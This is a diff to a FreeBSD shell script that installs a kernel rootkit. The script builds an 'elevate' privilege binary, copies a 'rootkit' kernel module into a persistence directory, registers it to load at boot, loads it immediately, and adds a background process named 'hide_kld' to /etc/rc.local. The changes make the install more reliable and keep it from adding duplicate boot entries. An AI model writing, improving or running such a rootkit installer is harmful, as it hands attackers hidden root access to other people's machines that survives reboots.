@@ -16,7 +16,7 @@ ELEVATE_BIN="$USERSPACE_DIR/elevate"
 
 
 # Check dependencies
-for command in make kldload kldstat cc install sysrc; do
+for command in make kldload kldstat cc install sysrc realpath; do
     command -v "$command" >/dev/null 2>&1
 done
 
@@ -31,8 +31,12 @@ cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
 
 
 # Ensures persistence 
-install -d -m 755 "$PERSISTENCE_DIR"
+MODULE_LOADED=false
+if kldstat -q -m rootkit >/dev/null 2>&1 || [ -c /dev/rootkit ]; then
+    MODULE_LOADED=true
+fi
 
+install -d -m 755 "$PERSISTENCE_DIR"
 install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
 
 
@@ -41,16 +45,12 @@ sysrc kld_list+=rootkit >/dev/null
 
 
 # Load it during the current boot
-if kldstat -q -m rootkit >/dev/null 2>&1; then
-    break
-else
-    kldload "$PERSISTENCE_FILE" ||
-        fail "Failed to load $PERSISTENCE_FILE"
-fi
+if [ "$MODULE_LOADED" = false ]; then
+    kldload "$PERSISTENCE_FILE"
 
-
-# Check if rootkit.ko is loaded
-kldstat -q -m rootkit >/dev/null 2>&1
+    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
+        exit 1
+    fi
 
 
 # Verify elevate was built successfully
@@ -73,6 +73,10 @@ if [ ! -f /etc/rc.local ]; then
 fi
 chmod +x /etc/rc.local
 
-echo "$ABS_PATH &" >> /etc/rc.local
+
+# Ensures no duplicate entries in rc.local
+if ! grep -q "hide_kld" /etc/rc.local; then
+    echo "$ABS_PATH &" >> /etc/rc.local
+fi
 
 "$ABS_PATH" &
